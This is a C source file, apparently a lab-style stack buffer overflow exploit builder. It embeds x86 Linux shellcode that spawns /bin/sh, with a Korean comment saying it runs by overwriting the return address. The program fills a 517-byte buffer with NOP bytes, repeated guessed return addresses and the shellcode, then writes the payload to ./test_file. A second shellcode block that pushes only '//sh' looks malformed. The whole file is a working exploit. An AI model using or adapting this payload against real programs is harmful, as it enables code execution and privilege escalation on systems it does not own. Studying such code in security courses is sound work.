#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = //ret 주소를 변조하여 실행될 어셈블리 
	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"

	//-- second code

	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"
;

unsigned long get_sp()
{
	__asm__("movl %esp, %eax");
}

void main(int argc, char **argv)
{
	char buffer[517];
	FILE *test_file;

	memset(&buffer, 0x90,517);

	int i = 0;

	char *ptr;
	long *addrptr;
	long retaddr;
	int num = sizeof(buffer) - (sizeof(shellcode) +1);
	ptr = buffer;
	addrptr = (long*)(ptr);

	retaddr = get_sp() + 500;


	for(i=0; i<20; i++)
	{
		*(addrptr++) = retaddr;
	}	

	for(i=0; i<sizeof(shellcode); i++)
	{
		buffer[num + i] = shellcode[i];	
	}

	buffer[sizeof(buffer) -1] = '\0';
	
	
	test_file = fopen("./test_file", "w");
	fwrite(buffer, 517, 1, test_file);
	fclose(test_file);
}







